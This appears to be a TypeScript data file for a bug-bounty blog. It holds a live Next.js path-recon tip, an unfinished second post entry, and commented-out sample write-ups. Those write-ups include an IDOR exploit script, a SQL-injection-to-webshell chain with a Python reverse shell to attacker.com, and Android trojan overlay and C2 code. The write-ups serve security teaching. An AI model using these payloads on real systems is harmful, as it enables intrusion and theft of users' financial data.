export interface BlogPost {
  id: string;
  slug: string;
  title: string;
  description: string;
  date: string;
  readTime: string;
  tags: string[];
  image: string;
  author: string;
  content: BlogContent[];
}

export interface BlogContent {
  type:
    | "paragraph"
    | "heading"
    | "code"
    | "image"
    | "list"
    | "blockquote"
    | "callout";
  content?: string;
  language?: string;
  level?: number;
  items?: string[];
  src?: string;
  alt?: string;
  caption?: string;
  variant?: "info" | "warning" | "danger" | "success";
}

export const blogPosts: BlogPost[] = [
  {
    id: "1",
    slug: "next-js-recon-tips-to-discover-all-paths",
    title: "Next.js Recon Tips to Discover All Paths",
    description: 'A quick way to find "all" paths for Next.js websites:',
    date: "2026-03-28",
    readTime: "5 min",
    tags: ["Next.js", "Reconnaissance", "Web Security", "Bug Bounty"],
    image:
      "https://raw.githubusercontent.com/r3dw4n48m3d/r3dw4n48m3d.github.io/refs/heads/main/src/images/next-js-recon-tips-to-discover-all-paths/image.png",
    author: "Redwan Ahmed",
    content: [
      {
        type: "callout",
        variant: "success",
        content: "Assalamu Alaikum!",
      },
      {
        type: "heading",
        level: 2,
        content: "Next.js Recon Tips to Discover All Paths",
      },
      {
        type: "paragraph",
        content:
          "This is a tips that will help you to find all the paths for a Next.js website. This is especially useful for bug bounty hunters and security researchers who want to discover hidden endpoints and directories that may not be easily found through traditional crawling methods.",
      },
      {
        type: "heading",
        level: 2,
        content: "Steps to Reproduce :",
      },
      {
        type: "list",
        items: [
          "Open a Browser",
          "Go to Developer Tools and Open Console",
          "Enter/Paste this command",
        ],
      },
      {
        type: "code",
        language: "javascript",
        content: `// Use this for Detailed View
console.log(__BUILD_MANIFEST.sortedPages)

// Use this sorted list to find all the paths in a Next.js website
javascript:console.log(__BUILD_MANIFEST.sortedPages.join('\n'));`,
      },
      {
        type: "callout",
        variant: "info",
        content: "You will find all the paths.",
      },
      {
        type: "image",
        src: "https://raw.githubusercontent.com/r3dw4n48m3d/r3dw4n48m3d.github.io/refs/heads/main/src/images/next-js-recon-tips-to-discover-all-paths/image.png",
        alt: "Next.js Recon Tips",
        caption: "Discover all paths in a Next.js website",
      },
      {
        type: "callout",
        variant: "danger",
        content:
          "If a website don’t return any path then the website don’t have Build Manifest function",
      },
      {
        type: "paragraph",
        content:
          "Thanks for reading! If you have any questions or want to share your own tips, feel free to reach out on Twitter orconnect with me on LinkedIn.",
      },
      {
        type: "callout",
        variant: "success",
        content: "Twitter : @r3dw4n48m3d",
      },
      {
        type: "callout",
        variant: "success",
        content: "LinkedIn : @r3dw4n-48m3d",
      },
      {
        type: "callout",
        variant: "danger",
        content: "Logged Out",
      },
    ],
  },
  {
    id: "2",
    slug: "bug-bounty-methodology-part-one",
    title: "Bug Bounty Methodology - Part One",
    description: "All steps clearly listed for beginners to advanced hunters",
    date: "2024-04-16",
    readTime: "10 min",
    tags: ["Bug Bounty", "Methodology", "Tutorial", "Security Research"],
    
  },
  //   {
  //     id: "1",
  //     slug: "how-i-hacked-into-a-banking-app",
  //     title: "How I Hacked Into a Banking App - Bug Bounty Write-up",
  //     description:
  //       "A detailed write-up of how I discovered a critical IDOR vulnerability in a major banking application that could have exposed millions of user accounts.",
  //     date: "2024-01-15",
  //     readTime: "12 min",
  //     tags: ["Bug Bounty", "IDOR", "API Security", "Write-up"],
  //     image: "https://images.unsplash.com/photo-1563986768609-322da13575f3?w=800",
  //     author: "CyberPhantom",
  //     content: [
  //       {
  //         type: "paragraph",
  //         content:
  //           "As a security researcher, I'm always on the lookout for vulnerabilities in applications. Recently, I discovered a critical IDOR (Insecure Direct Object Reference) vulnerability in a major banking application that could have exposed millions of user accounts. In this write-up, I'll walk you through the entire process of discovery, exploitation, and responsible disclosure.",
  //       },
  //       {
  //         type: "callout",
  //         variant: "warning",
  //         content:
  //           "⚠️ Disclaimer: This research was conducted under a responsible disclosure program. Never attempt to hack systems without explicit permission.",
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Initial Reconnaissance",
  //       },
  //       {
  //         type: "paragraph",
  //         content:
  //           "I started by analyzing the mobile application's traffic using Burp Suite. After setting up my proxy and installing the SSL certificate, I began mapping out the API endpoints.",
  //       },
  //       {
  //         type: "code",
  //         language: "bash",
  //         content: `# Setting up Burp Suite proxy
  // export http_proxy="http://127.0.0.1:8080"
  // export https_proxy="http://127.0.0.1:8080"
  // # Installing Burp CA certificate on Android
  // adb push burp-ca.crt /sdcard/
  // adb shell settings put global http_proxy 192.168.1.100:8080`,
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Discovering the Vulnerability",
  //       },
  //       {
  //         type: "paragraph",
  //         content:
  //           "While analyzing the API requests, I noticed an interesting endpoint that fetched user account details:",
  //       },
  //       {
  //         type: "code",
  //         language: "http",
  //         content: `GET /api/v1/accounts/12345678 HTTP/1.1
  // Host: api.bankingapp.com
  // Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
  // Content-Type: application/json`,
  //       },
  //       {
  //         type: "paragraph",
  //         content:
  //           'The account number "12345678" caught my attention. I wondered what would happen if I changed it to a different number...',
  //       },
  //       {
  //         type: "code",
  //         language: "http",
  //         content: `GET /api/v1/accounts/12345679 HTTP/1.1
  // Host: api.bankingapp.com
  // Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
  // Content-Type: application/json
  // Response:
  // {
  //   "account_id": "12345679",
  //   "name": "John Doe",
  //   "email": "john.doe@email.com",
  //   "balance": "$45,230.00",
  //   "transactions": [...]
  // }`,
  //       },
  //       {
  //         type: "callout",
  //         variant: "danger",
  //         content:
  //           "🚨 CRITICAL: The API returned another user's complete financial information!",
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Impact Assessment",
  //       },
  //       {
  //         type: "paragraph",
  //         content: "This vulnerability had severe implications:",
  //       },
  //       {
  //         type: "list",
  //         items: [
  //           "Access to personal information (name, email, phone)",
  //           "Complete transaction history exposure",
  //           "Account balance disclosure",
  //           "Potential for targeted phishing attacks",
  //           "Regulatory compliance violations (GDPR, PCI-DSS)",
  //         ],
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Proof of Concept Script",
  //       },
  //       {
  //         type: "paragraph",
  //         content:
  //           "I created a simple Python script to demonstrate the vulnerability (for the security team):",
  //       },
  //       {
  //         type: "code",
  //         language: "python",
  //         content: `#!/usr/bin/env python3
  // import requests
  // import sys
  // def exploit_idor(account_id, token):
  //     """
  //     Proof of Concept - IDOR Vulnerability
  //     For authorized security testing only
  //     """
  //     headers = {
  //         'Authorization': f'Bearer {token}',
  //         'Content-Type': 'application/json'
  //     }
  //     url = f'https://api.bankingapp.com/api/v1/accounts/{account_id}'
  //     try:
  //         response = requests.get(url, headers=headers)
  //         if response.status_code == 200:
  //             data = response.json()
  //             print(f"[+] Account: {data['account_id']}")
  //             print(f"[+] Name: {data['name']}")
  //             print(f"[+] Balance: {data['balance']}")
  //             return data
  //         else:
  //             print(f"[-] Failed: {response.status_code}")
  //     except Exception as e:
  //         print(f"[-] Error: {e}")
  // if __name__ == "__main__":
  //     # This is for demonstration only
  //     print("IDOR PoC - Authorized Testing Only")
  //     # exploit_idor("12345679", "your_token_here")`,
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Responsible Disclosure Timeline",
  //       },
  //       {
  //         type: "list",
  //         items: [
  //           "Day 0: Vulnerability discovered",
  //           "Day 1: Initial report submitted via HackerOne",
  //           "Day 2: Triaged by security team",
  //           "Day 5: Vulnerability confirmed",
  //           "Day 14: Patch deployed to production",
  //           "Day 30: Bounty awarded ($15,000)",
  //           "Day 90: Public disclosure approved",
  //         ],
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Remediation Recommendations",
  //       },
  //       {
  //         type: "paragraph",
  //         content:
  //           "I provided the following recommendations to the security team:",
  //       },
  //       {
  //         type: "code",
  //         language: "python",
  //         content: `# BEFORE (Vulnerable)
  // @app.route('/api/v1/accounts/<account_id>')
  // def get_account(account_id):
  //     return Account.query.get(account_id).to_json()
  // # AFTER (Secure)
  // @app.route('/api/v1/accounts/<account_id>')
  // @jwt_required()
  // def get_account(account_id):
  //     current_user = get_jwt_identity()
  //     account = Account.query.get(account_id)
  //     # Authorization check
  //     if account.user_id != current_user['id']:
  //         abort(403, "Unauthorized access")
  //     return account.to_json()`,
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Key Takeaways",
  //       },
  //       {
  //         type: "paragraph",
  //         content: "This bug bounty hunt taught me several important lessons:",
  //       },
  //       {
  //         type: "list",
  //         items: [
  //           "Always check for authorization, not just authentication",
  //           "Sequential IDs are a red flag - use UUIDs instead",
  //           "API security is just as important as web security",
  //           "Responsible disclosure protects everyone",
  //           "Document everything for your report",
  //         ],
  //       },
  //       {
  //         type: "callout",
  //         variant: "success",
  //         content: "💰 Bounty Received: $15,000 USD - Critical severity rating",
  //       },
  //       {
  //         type: "paragraph",
  //         content:
  //           "Thanks for reading! If you have any questions, feel free to reach out on Twitter @CyberPhantom or connect with me on LinkedIn.",
  //       },
  //     ],
  //   },
  //   {
  //     id: "2",
  //     slug: "sql-injection-to-rce",
  //     title: "From SQL Injection to Remote Code Execution",
  //     description:
  //       "How I escalated a simple SQL injection vulnerability to achieve remote code execution on a production server.",
  //     date: "2024-02-20",
  //     readTime: "15 min",
  //     tags: ["SQL Injection", "RCE", "Penetration Testing", "Write-up"],
  //     image: "https://images.unsplash.com/photo-1555949963-ff9fe0c870eb?w=800",
  //     author: "CyberPhantom",
  //     content: [
  //       {
  //         type: "paragraph",
  //         content:
  //           "During a recent penetration testing engagement, I discovered how a seemingly simple SQL injection vulnerability could be escalated to achieve full remote code execution on the target server. This write-up details the complete attack chain.",
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Target Overview",
  //       },
  //       {
  //         type: "paragraph",
  //         content:
  //           "The target was a web application running on a LAMP stack (Linux, Apache, MySQL, PHP). Initial reconnaissance revealed several interesting endpoints.",
  //       },
  //       {
  //         type: "code",
  //         language: "bash",
  //         content: `# Directory enumeration
  // gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
  // # Results:
  // /admin          (Status: 302)
  // /api            (Status: 200)
  // /uploads        (Status: 403)
  // /backup         (Status: 403)`,
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Finding the SQL Injection",
  //       },
  //       {
  //         type: "paragraph",
  //         content:
  //           "The search functionality on the website was vulnerable to SQL injection. I used SQLMap for initial testing:",
  //       },
  //       {
  //         type: "code",
  //         language: "bash",
  //         content: `# Testing for SQL injection
  // sqlmap -u "https://target.com/search?q=test" --dbs --batch
  // # Output:
  // [*] available databases:
  // [*] information_schema
  // [*] mysql
  // [*] webapp_db
  // [*] performance_schema`,
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Escalation to File Write",
  //       },
  //       {
  //         type: "paragraph",
  //         content:
  //           "I discovered that the MySQL user had FILE privileges, allowing me to write files to the server:",
  //       },
  //       {
  //         type: "code",
  //         language: "sql",
  //         content: `-- Check privileges
  // SELECT * FROM mysql.user WHERE user = 'webapp_user'\\G
  // -- Writing a PHP webshell
  // SELECT '<?php system($_GET["cmd"]); ?>'
  // INTO OUTFILE '/var/www/html/uploads/shell.php';`,
  //       },
  //       {
  //         type: "callout",
  //         variant: "danger",
  //         content:
  //           "🔥 This is why you should never give FILE privileges to web application database users!",
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Achieving RCE",
  //       },
  //       {
  //         type: "paragraph",
  //         content: "With the webshell uploaded, I had remote code execution:",
  //       },
  //       {
  //         type: "code",
  //         language: "bash",
  //         content: `# Testing RCE
  // curl "https://target.com/uploads/shell.php?cmd=id"
  // # uid=33(www-data) gid=33(www-data) groups=33(www-data)
  // curl "https://target.com/uploads/shell.php?cmd=uname%20-a"
  // # Linux webserver 5.4.0-42-generic #46-Ubuntu SMP x86_64 GNU/Linux`,
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Establishing Persistent Access",
  //       },
  //       {
  //         type: "paragraph",
  //         content:
  //           "For better shell access, I established a reverse shell connection:",
  //       },
  //       {
  //         type: "code",
  //         language: "bash",
  //         content: `# On attacker machine
  // nc -lvnp 4444
  // # On target via webshell
  // curl "https://target.com/uploads/shell.php?cmd=python3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
  // # Got shell!
  // $ whoami
  // www-data`,
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Lessons Learned",
  //       },
  //       {
  //         type: "list",
  //         items: [
  //           "Use parameterized queries to prevent SQL injection",
  //           "Follow principle of least privilege for database users",
  //           "Disable FILE privileges unless absolutely necessary",
  //           "Implement proper input validation and output encoding",
  //           "Regular security assessments are crucial",
  //         ],
  //       },
  //       {
  //         type: "callout",
  //         variant: "info",
  //         content:
  //           "📝 This assessment was conducted with proper authorization. Always obtain written permission before testing.",
  //       },
  //     ],
  //   },
  //   {
  //     id: "3",
  //     slug: "building-a-home-lab-for-ethical-hacking",
  //     title: "Building a Home Lab for Ethical Hacking",
  //     description:
  //       "A complete guide to setting up your own cybersecurity home lab for practicing penetration testing and security research.",
  //     date: "2024-03-10",
  //     readTime: "20 min",
  //     tags: ["Home Lab", "Tutorial", "Virtualization", "Learning"],
  //     image: "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800",
  //     author: "CyberPhantom",
  //     content: [
  //       {
  //         type: "paragraph",
  //         content:
  //           "Every aspiring ethical hacker needs a safe environment to practice their skills. In this comprehensive guide, I'll walk you through setting up a professional-grade home lab for cybersecurity research and penetration testing practice.",
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Hardware Requirements",
  //       },
  //       {
  //         type: "paragraph",
  //         content: "Here's what I recommend for a solid home lab setup:",
  //       },
  //       {
  //         type: "list",
  //         items: [
  //           "CPU: Intel i7 or AMD Ryzen 7 (8+ cores recommended)",
  //           "RAM: Minimum 32GB (64GB preferred for multiple VMs)",
  //           "Storage: 1TB NVMe SSD + 2TB HDD for storage",
  //           "Network: Gigabit Ethernet + USB WiFi adapter for wireless testing",
  //         ],
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Installing Proxmox VE",
  //       },
  //       {
  //         type: "paragraph",
  //         content:
  //           "Proxmox VE is a powerful open-source virtualization platform. Here's how to install it:",
  //       },
  //       {
  //         type: "code",
  //         language: "bash",
  //         content: `# Download Proxmox VE ISO from proxmox.com
  // # Create bootable USB with Rufus or dd
  // # After installation, update the system
  // apt update && apt full-upgrade -y
  // # Remove enterprise repository (for home lab use)
  // rm /etc/apt/sources.list.d/pve-enterprise.list
  // # Add no-subscription repository
  // echo "deb http://download.proxmox.com/debian/pve bookworm pve-no-subscription" > /etc/apt/sources.list.d/pve-no-subscription.list
  // apt update`,
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Setting Up Attack Machine (Kali Linux)",
  //       },
  //       {
  //         type: "code",
  //         language: "bash",
  //         content: `# Download Kali Linux VM image
  // wget https://cdimage.kali.org/kali-2024.1/kali-linux-2024.1-qemu-amd64.7z
  // # Extract and import to Proxmox
  // 7z x kali-linux-2024.1-qemu-amd64.7z
  // # Update Kali after first boot
  // sudo apt update && sudo apt full-upgrade -y
  // # Install additional tools
  // sudo apt install -y gobuster feroxbuster bloodhound neo4j`,
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Vulnerable Machines to Practice",
  //       },
  //       {
  //         type: "paragraph",
  //         content: "Here are some excellent vulnerable machines to practice on:",
  //       },
  //       {
  //         type: "list",
  //         items: [
  //           "DVWA (Damn Vulnerable Web Application)",
  //           "Metasploitable 2 & 3",
  //           "VulnHub machines",
  //           "HackTheBox (online)",
  //           "TryHackMe (online)",
  //           "DVCP (Damn Vulnerable Chemical Process)",
  //         ],
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Network Segmentation",
  //       },
  //       {
  //         type: "paragraph",
  //         content: "Proper network segmentation is crucial for lab safety:",
  //       },
  //       {
  //         type: "code",
  //         language: "bash",
  //         content: `# Create isolated network in Proxmox
  // # Network configuration for isolated lab
  // # /etc/network/interfaces
  // auto vmbr1
  // iface vmbr1 inet static
  //     address 10.10.10.1/24
  //     bridge-ports none
  //     bridge-stp off
  //     bridge-fd 0
  //     post-up echo 1 > /proc/sys/net/ipv4/ip_forward
  //     post-up iptables -t nat -A POSTROUTING -s '10.10.10.0/24' -o vmbr0 -j MASQUERADE
  //     post-down iptables -t nat -D POSTROUTING -s '10.10.10.0/24' -o vmbr0 -j MASQUERADE`,
  //       },
  //       {
  //         type: "callout",
  //         variant: "warning",
  //         content:
  //           "⚠️ Always isolate your lab network from your production network to prevent accidental damage!",
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Essential Tools to Install",
  //       },
  //       {
  //         type: "code",
  //         language: "bash",
  //         content: `# Reconnaissance
  // sudo apt install nmap masscan amass subfinder
  // # Web Application Testing
  // sudo apt install burpsuite zaproxy nikto sqlmap
  // # Exploitation
  // sudo apt install metasploit-framework exploitdb searchsploit
  // # Post-Exploitation
  // sudo apt install empire mimikatz bloodhound
  // # Wireless Testing
  // sudo apt install aircrack-ng wifite kismet
  // # Password Attacks
  // sudo apt install hashcat john hydra`,
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Conclusion",
  //       },
  //       {
  //         type: "paragraph",
  //         content:
  //           "With this setup, you'll have a professional-grade home lab for practicing ethical hacking. Remember to always practice responsibly and never test on systems you don't own or have explicit permission to test.",
  //       },
  //       {
  //         type: "callout",
  //         variant: "success",
  //         content:
  //           "🎯 Pro Tip: Document everything you learn. Start a blog or take notes - it'll help you remember and build your professional portfolio!",
  //       },
  //     ],
  //   },
  //   {
  //     id: "4",
  //     slug: "reverse-engineering-android-malware",
  //     title: "Reverse Engineering Android Malware",
  //     description:
  //       "A deep dive into analyzing and reverse engineering a real Android banking trojan to understand its capabilities and behavior.",
  //     date: "2024-03-25",
  //     readTime: "25 min",
  //     tags: ["Malware Analysis", "Android", "Reverse Engineering", "Research"],
  //     image: "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=800",
  //     author: "CyberPhantom",
  //     content: [
  //       {
  //         type: "paragraph",
  //         content:
  //           "In this write-up, I'll walk you through the process of reverse engineering an Android banking trojan that I analyzed in my malware research lab. We'll cover static analysis, dynamic analysis, and the techniques this malware uses to steal credentials.",
  //       },
  //       {
  //         type: "callout",
  //         variant: "danger",
  //         content:
  //           "☣️ WARNING: Malware analysis should only be performed in isolated environments. Never run malware on your personal devices!",
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Setting Up the Analysis Environment",
  //       },
  //       {
  //         type: "code",
  //         language: "bash",
  //         content: `# Install required tools
  // pip install androguard frida-tools objection
  // # Install JADX for decompilation
  // wget https://github.com/skylot/jadx/releases/latest/download/jadx-1.4.7.zip
  // unzip jadx-1.4.7.zip -d jadx
  // # Set up Android emulator with root
  // emulator -avd Pixel_4_API_30 -writable-system`,
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Static Analysis",
  //       },
  //       {
  //         type: "paragraph",
  //         content:
  //           "Let's start by examining the APK structure and decompiling it:",
  //       },
  //       {
  //         type: "code",
  //         language: "bash",
  //         content: `# Get APK info
  // aapt dump badging malware.apk
  // # Decompile with JADX
  // ./jadx/bin/jadx -d output malware.apk
  // # Check AndroidManifest.xml for permissions
  // cat output/resources/AndroidManifest.xml | grep "uses-permission"`,
  //       },
  //       {
  //         type: "paragraph",
  //         content: "The malware requested suspicious permissions:",
  //       },
  //       {
  //         type: "code",
  //         language: "xml",
  //         content: `<uses-permission android:name="android.permission.RECEIVE_SMS"/>
  // <uses-permission android:name="android.permission.READ_SMS"/>
  // <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
  // <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"/>
  // <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>`,
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Analyzing the Malicious Code",
  //       },
  //       {
  //         type: "paragraph",
  //         content: "The decompiled code revealed an overlay attack mechanism:",
  //       },
  //       {
  //         type: "code",
  //         language: "java",
  //         content: `// Overlay injection code found in BankOverlayService.java
  // public class BankOverlayService extends AccessibilityService {
  //     private static final String[] TARGET_BANKS = {
  //         "com.bank.america",
  //         "com.chase.mobile",
  //         "com.wellsfargo.mobile"
  //     };
  //     @Override
  //     public void onAccessibilityEvent(AccessibilityEvent event) {
  //         String packageName = event.getPackageName().toString();
  //         for (String target : TARGET_BANKS) {
  //             if (packageName.equals(target)) {
  //                 // Show fake overlay to steal credentials
  //                 showPhishingOverlay(target);
  //                 break;
  //             }
  //         }
  //     }
  //     private void showPhishingOverlay(String bankPackage) {
  //         Intent overlay = new Intent(this, FakeLoginActivity.class);
  //         overlay.putExtra("target", bankPackage);
  //         overlay.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
  //         startActivity(overlay);
  //     }
  // }`,
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Dynamic Analysis with Frida",
  //       },
  //       {
  //         type: "paragraph",
  //         content:
  //           "I used Frida to hook into the malware's functions at runtime:",
  //       },
  //       {
  //         type: "code",
  //         language: "javascript",
  //         content: `// frida_hook.js - Hook credential stealing function
  // Java.perform(function() {
  //     var FakeLoginActivity = Java.use("com.malware.FakeLoginActivity");
  //     FakeLoginActivity.sendCredentials.implementation = function(username, password) {
  //         console.log("[*] Intercepted credentials:");
  //         console.log("    Username: " + username);
  //         console.log("    Password: " + password);
  //         // Call original to see where data is sent
  //         return this.sendCredentials(username, password);
  //     };
  //     // Hook network communications
  //     var URL = Java.use("java.net.URL");
  //     URL.$init.overload('java.lang.String').implementation = function(url) {
  //         console.log("[*] Network request to: " + url);
  //         return this.$init(url);
  //     };
  // });`,
  //       },
  //       {
  //         type: "code",
  //         language: "bash",
  //         content: `# Run Frida hook
  // frida -U -f com.malware.app -l frida_hook.js --no-pause
  // # Output:
  // [*] Intercepted credentials:
  //     Username: victim@email.com
  //     Password: SecretPass123
  // [*] Network request to: https://evil-c2.com/api/steal`,
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Command & Control Infrastructure",
  //       },
  //       {
  //         type: "paragraph",
  //         content:
  //           "The malware communicated with a C2 server using encrypted payloads:",
  //       },
  //       {
  //         type: "code",
  //         language: "python",
  //         content: `# C2 communication decryption
  // import base64
  // from Crypto.Cipher import AES
  // def decrypt_c2_payload(encrypted_data, key):
  //     """Decrypt C2 command payload"""
  //     cipher = AES.new(key.encode(), AES.MODE_CBC, iv=b'0000000000000000')
  //     decrypted = cipher.decrypt(base64.b64decode(encrypted_data))
  //     return decrypted.decode().strip()
  // # Extracted from malware
  // key = "MalwareSecretKey"
  // encrypted = "U2FsdGVkX1+encrypted_data_here..."
  // command = decrypt_c2_payload(encrypted, key)
  // print(f"C2 Command: {command}")
  // # Output: C2 Command: {"action": "overlay", "target": "com.chase.mobile"}`,
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Indicators of Compromise (IOCs)",
  //       },
  //       {
  //         type: "list",
  //         items: [
  //           "SHA256: a1b2c3d4e5f6...malware_hash",
  //           "C2 Domain: evil-c2.com",
  //           "C2 IP: 185.xx.xx.xx",
  //           "Package Name: com.security.update",
  //           "Certificate: CN=Android Debug, O=Android",
  //         ],
  //       },
  //       {
  //         type: "callout",
  //         variant: "info",
  //         content:
  //           "🔍 These IOCs have been shared with threat intelligence platforms to help protect users.",
  //       },
  //       {
  //         type: "heading",
  //         level: 2,
  //         content: "Protection Recommendations",
  //       },
  //       {
  //         type: "list",
  //         items: [
  //           "Only install apps from official Google Play Store",
  //           "Check app permissions before installing",
  //           "Keep your device updated with latest security patches",
  //           "Use mobile security software",
  //           "Be wary of apps requesting Accessibility permissions",
  //           "Enable Google Play Protect",
  //         ],
  //       },
  //     ],
  // },
];

export const getPostBySlug = (slug: string): BlogPost | undefined => {
  return blogPosts.find((post) => post.slug === slug);
};

export const getAllPosts = (): BlogPost[] => {
  return blogPosts.sort(
    (a, b) => new Date(b.date).getTime() - new Date(a.date).getTime(),
  );
};
